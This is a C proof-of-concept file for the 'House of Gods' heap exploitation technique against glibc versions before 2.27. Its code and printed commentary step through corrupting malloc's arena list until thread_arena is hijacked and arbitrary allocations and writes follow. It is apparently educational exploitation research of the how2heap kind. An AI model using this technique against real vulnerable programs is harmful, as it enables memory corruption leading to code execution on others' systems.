/* House of Gods PoC */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <inttypes.h>

/*
 * Welcome to the House of Gods...
 *
 * House of Gods is an arena hijacking technique for glibc < 2.27. It supplies
 * the attacker with an arbitrary write against the thread_arena symbol of
 * the main thread. This can be used to replace the main_arena with a
 * carefully crafted fake arena. The exploit was tested against
 *
 *     - glibc-2.23
 *     - glibc-2.24
 *     - glibc-2.25
 *     - glibc-2.26
 *
 * Following requirements are mandatory
 *
 *     - 8 allocs of arbitrary size to hijack the arena (+2 for ACE)
 *     - control over first 5 quadwords of a chunk's userdata
 *     - a single write-after-free bug on an unsorted chunk
 *     - heap address leak + libc address leak
 *
 * This PoC demonstrates how to leverage the House of Gods in order to hijack
 * the thread_arena. But it wont explain how to escalate further to
 * arbitrary code execution, since this step is trivial once the whole arena
 * is under control.
 *
 * Also note, that the how2heap PoC might use more allocations than
 * previously stated. This is intentional and has educational purposes.
 *
 * If you want to read the full technical description of this technique, going
 * from zero to arbitrary code execution within only 10 to 11 allocations, here
 * is the original document I've written
 *
 *     https://github.com/Milo-D/house-of-gods/blob/master/rev2/HOUSE_OF_GODS.TXT
 *
 * I recommend reading this document while experimenting with
 * the how2heap PoC.
 *
 * Besides that, this technique abuses a minor bug in glibc, which I have
 * already submitted to bugzilla at
 *
 *     https://sourceware.org/bugzilla/show_bug.cgi?id=29709
 *
 * AUTHOR: David Milosevic (milo)
 *
 * */

/* <--- Exploit PoC ---> */

int main(void) {

    printf("=================\n");
    printf("= House of Gods =\n");
    printf("=================\n\n");

    printf("=== Abstract ===\n\n");

    printf("The core of this technique is to allocate a fakechunk overlapping\n");
    printf("the binmap field within the main_arena. This fakechunk is located at\n");
    printf("offset 0x850. Its sizefield can be crafted by carefully binning chunks\n");
    printf("into smallbins or largebins. The binmap-chunk is then being linked into\n");
    printf("the unsorted bin via a write-after-free bug in order to allocate it back\n");
    printf("as an exact fit. One can now tamper with the main_arena.next pointer at\n");
    printf("offset 0x868 and inject the address of a fake arena. A final unsorted bin\n");
    printf("attack corrupts the narenas variable with a very large value. From there, only\n");
    printf("two more allocation requests for at least 0xffffffffffffffc0 bytes of memory\n");
    printf("are needed to trigger two consecutive calls to the reused_arena() function,\n");
    printf("which in turn traverses the corrupted arena-list and sets thread_arena to the\n");
    printf("address stored in main_arena.next - the address of the fake arena.\n\n");

    printf("=== PoC ===\n\n");

    printf("Okay, so let us start by allocating some chunks...\n\n");

    /*
     * allocate a smallchunk, for example a 0x90-chunk.
     * */
    void *SMALLCHUNK = malloc(0x88);

    /*
     * allocate the first fastchunk. We will use
     * a 0x20-chunk for this purpose.
     * */
    void *FAST20 = malloc(0x18);

    /*
     * allocate a second fastchunk. This time
     * a 0x40-chunk.
     * */
    void *FAST40 = malloc(0x38);

    printf("%p is our 0x90-sized smallchunk. We will bin this chunk to forge a\n", SMALLCHUNK);
    printf("fake sizefield for our binmap-chunk.\n\n");

    printf("%p is our first fastchunk. Its size is 0x20.\n\n", FAST20);

    printf("%p is our second fastchunk with a size of 0x40. The usecase of\n", FAST40);
    printf("both fastchunks will be explained later in this PoC.\n\n");

    printf("We can move our smallchunk to the unsorted bin by simply free'ing it...\n\n");

    /*
     * put SMALLCHUNK into the unsorted bin.
     * */
    free(SMALLCHUNK);

    /*
     * this is a great opportunity to simulate a
     * libc leak. We just read the address of the
     * unsorted bin and save it for later.
     * */
    const uint64_t leak = *((uint64_t*) SMALLCHUNK);

    printf("And now we need to make a request for a chunk which can not be serviced by\n");
    printf("our recently free'd smallchunk. Thus, we will make a request for a\n");
    printf("0xa0-sized chunk - let us call this chunk INTM (intermediate).\n\n");

    /*
     * following allocation will trigger a binning
     * process within the unsorted bin and move
     * SMALLCHUNK to the 0x90-smallbin.
     * */
    void *INTM = malloc(0x98);

    printf("Our smallchunk should be now in the 0x90-smallbin. This process also triggered\n");
    printf("the mark_bin(m, i) macro within the malloc source code. If you inspect the\n");
    printf("main_arena's binmap located at offset 0x855, you will notice that the initial\n");
    printf("value of the binmap changed from 0x0 to 0x200 - which can be used as a valid\n");
    printf("sizefield to bypass the unsorted bin checks.\n\n");

    printf("We would also need a valid bk pointer in order to bypass the partial unlinking\n");
    printf("procedure within the unsorted bin. But luckily, the main_arena.next pointer at\n");
    printf("offset 0x868 points initially to the start of the main_arena itself. This fact\n");
    printf("makes it possible to pass the partial unlinking without segfaulting.\n\n");

    printf("So now that we have crafted our binmap-chunk, it is time to allocate it\n");
    printf("from the unsorted bin. For that, we will abuse a write-after-free bug\n");
    printf("on an unsorted chunk. Let us start...\n\n");

    printf("First, allocate another smallchunk...\n");

    /*
     * recycle our previously binned smallchunk.
     * Note that, it is not neccessary to recycle this
     * chunk. I am doing it only to keep the heap layout
     * small and compact.
     * */
    SMALLCHUNK = malloc(0x88);

    printf("...and now move our new chunk to the unsorted bin...\n");

    /*
     * put SMALLCHUNK into the unsorted bin.
     * */
    free(SMALLCHUNK);

    printf("...in order to tamper with the free'd chunk's bk pointer.\n\n");

    /*
     * bug: a single write-after-free bug on an
     * unsorted chunk is enough to initiate the
     * House of Gods technique.
     * */
    *((uint64_t*) (SMALLCHUNK + 0x8)) = leak + 0x7f8;

    printf("Great. We have redirected the unsorted bin to our binmap-chunk.\n");
    printf("But we also have corrupted the bin. Let's fix this, by redirecting\n");
    printf("a second time.\n\n");

    printf("The next chunk (head->bk->bk->bk) in the unsorted bin is located at the start\n");
    printf("of the main-arena. We will abuse this fact and free a 0x20-chunk and a 0x40-chunk\n");
    printf("in order to forge a valid sizefield and bk pointer. We will also let the 0x40-chunk\n");
    printf("point to another allocated chunk (INTM) by writing to its bk pointer before\n");
    printf("actually free'ing it.\n\n");

    /*
     * before free'ing those chunks, let us write
     * the address of another chunk to the currently
     * unused bk pointer of FAST40. We can reuse
     * the previously requested INTM chunk for that.
     *
     * Free'ing FAST40 wont reset the bk pointer, thus
     * we can let it point to an allocated chunk while
     * having it stored in one of the fastbins.
     *
     * The reason behind this, is the simple fact that
     * we will need to perform an unsorted bin attack later.
     * And we can not request a 0x40-chunk to trigger the
     * partial unlinking, since a 0x40 request will be serviced
     * from the fastbins instead of the unsorted bin.
     * */
    *((uint64_t*) (FAST40 + 0x8)) = (uint64_t) (INTM - 0x10);

    /*
     * and now free the 0x20-chunk in order to forge a sizefield.
     * */
    free(FAST20);

    /*
     * and the 0x40-chunk in order to forge a bk pointer.
     * */
    free(FAST40);

    printf("Okay. The unsorted bin should now look like this\n\n");

    printf("head -> SMALLCHUNK -> binmap -> main-arena -> FAST40 -> INTM\n");
    printf("     bk            bk        bk            bk        bk\n\n");

    printf("The binmap attack is nearly done. The only thing left to do, is\n");
    printf("to make a request for a size that matches the binmap-chunk's sizefield.\n\n");

    /*
     * all the hard work finally pays off...we can
     * now allocate the binmap-chunk from the unsorted bin.
     * */
    void *BINMAP = malloc(0x1f8);

    printf("After allocating the binmap-chunk, the unsorted bin should look similar to this\n\n");

    printf("head -> main-arena -> FAST40 -> INTM\n");
    printf("     bk            bk        bk\n\n");

    printf("And that is a binmap attack. We've successfully gained control over a small\n");
    printf("number of fields within the main-arena. Two of them are crucial for\n");
    printf("the House of Gods technique\n\n");

    printf("    -> main_arena.next\n");
    printf("    -> main_arena.system_mem\n\n");

    printf("By tampering with the main_arena.next field, we can manipulate the arena's\n");
    printf("linked list and insert the address of a fake arena. Once this is done,\n");
    printf("we can trigger two calls to malloc's reused_arena() function.\n\n");

    printf("The purpose of the reused_arena() function is to return a non-corrupted,\n");
    printf("non-locked arena from the arena linked list in case that the current\n");
    printf("arena could not handle previous allocation request.\n\n");

    printf("The first call to reused_arena() will traverse the linked list and return\n");
    printf("a pointer to the current main-arena.\n\n");

    printf("The second call to reused_arena() will traverse the linked list and return\n");
    printf("a pointer to the previously injected fake arena (main_arena.next).\n\n");

    printf("We can reach the reused_arena() if we meet following conditions\n\n");

    printf("    - exceeding the total amount of arenas a process can have.\n");
    printf("      malloc keeps track by using the narenas variable as\n");
    printf("      an arena counter. If this counter exceeds the limit (narenas_limit),\n");
    printf("      it will start to reuse existing arenas from the arena list instead\n");
    printf("      of creating new ones. Luckily, we can set narenas to a very large\n");
    printf("      value by performing an unsorted bin attack against it.\n\n");

    printf("    - force the malloc algorithm to ditch the current arena.\n");
    printf("      When malloc notices a failure it will start a second allocation\n");
    printf("      attempt with a different arena. We can mimic an allocation failure by\n");
    printf("      simply requesting too much memory i.e. 0xffffffffffffffc0 and greater.\n\n");

    printf("Let us start with the unsorted bin attack. We load the address of narenas\n");
    printf("minus 0x10 into the bk pointer of the currently allocated INTM chunk...\n\n");

    /*
     * set INTM's bk to narenas-0x10. This will
     * be our target for the unsorted bin attack.
     * */
    *((uint64_t*) (INTM + 0x8)) = leak - 0xa20;

    printf("...and then manipulate the main_arena.system_mem field in order to pass the\n");
    printf("size sanity checks for the chunk overlapping the main-arena.\n\n");

    /*
     * this way we can abuse a heap pointer
     * as a valid sizefield.
     * */
    *((uint64_t*) (BINMAP + 0x20)) = 0xffffffffffffffff;

    printf("The unsorted bin should now look like this\n\n");

    printf("head -> main-arena -> FAST40 -> INTM -> narenas-0x10\n");
    printf("     bk            bk        bk      bk\n\n");

    printf("We can now trigger the unsorted bin attack by requesting the\n");
    printf("INTM chunk as an exact fit.\n\n");

    /*
     * request the INTM chunk from the unsorted bin
     * in order to trigger a partial unlinking between
     * head and narenas-0x10.
     * */
    INTM = malloc(0x98);

    printf("Perfect. narenas is now set to the address of the unsorted bin's head\n");
    printf("which should be large enough to exceed the existing arena limit.\n\n");

    printf("Let's proceed with the manipulation of the main_arena.next pointer\n");
    printf("within our previously allocated binmap-chunk. The address we write\n");
    printf("to this field will become the future value of thread_arena.\n\n");

    /*
     * set main_arena.next to an arbitrary address. The
     * next two calls to malloc will overwrite thread_arena
     * with the same address. I'll reuse INTM as fake arena.
     *
     * Note, that INTM is not suitable as fake arena but
     * nevertheless, it is an easy way to demonstrate that
     * we are able to set thread_arena to an arbitrary address.
     * */
    *((uint64_t*) (BINMAP + 0x8)) = (uint64_t) (INTM - 0x10);

    printf("Done. Now all what's left to do is to trigger two calls to the reused_arena()\n");
    printf("function by making two requests for an invalid chunksize.\n\n");

    /*
     * the first call will force the reused_arena()
     * function to set thread_arena to the address of
     * the current main-arena.
     * */
    malloc(0xffffffffffffffbf + 1);

    /*
     * the second call will force the reused_arena()
     * function to set thread_arena to the address stored
     * in main_arena.next - our fake arena.
     * */
    malloc(0xffffffffffffffbf + 1);

    printf("We did it. We hijacked the thread_arena symbol and from now on memory\n");
    printf("requests will be serviced by our fake arena. Let's check this out\n");
    printf("by allocating a fakechunk on the stack from one of the fastbins\n");
    printf("of our new fake arena.\n\n");

    /*
     * construct a 0x70-fakechunk on the stack...
     * */
    uint64_t fakechunk[4] = {

        0x0000000000000000, 0x0000000000000073,
        0x4141414141414141, 0x0000000000000000
    };

    /*
     * ...and place it in the 0x70-fastbin of our fake arena
     * */
    *((uint64_t*) (INTM + 0x20)) = (uint64_t) (fakechunk);

    printf("Fakechunk in position at stack address %p\n", fakechunk);
    printf("Target data within the fakechunk at address %p\n", &fakechunk[2]);
    printf("Its current value is %#lx\n\n", fakechunk[2]);

    printf("And after requesting a 0x70-chunk...\n");

    /*
     * use the fake arena to perform arbitrary allocations
     * */
    void *FAKECHUNK = malloc(0x68);

    printf("...malloc returns us the fakechunk at %p\n\n", FAKECHUNK);

    printf("Overwriting the newly allocated chunk changes the target\n");
    printf("data as well: ");

    /*
     * overwriting the target data
     * */
    *((uint64_t*) (FAKECHUNK)) = 0x4242424242424242;

    printf("%#lx\n", fakechunk[2]);

    /*
     * confirm success
     * */
    assert(fakechunk[2] == 0x4242424242424242);

    return EXIT_SUCCESS;
}
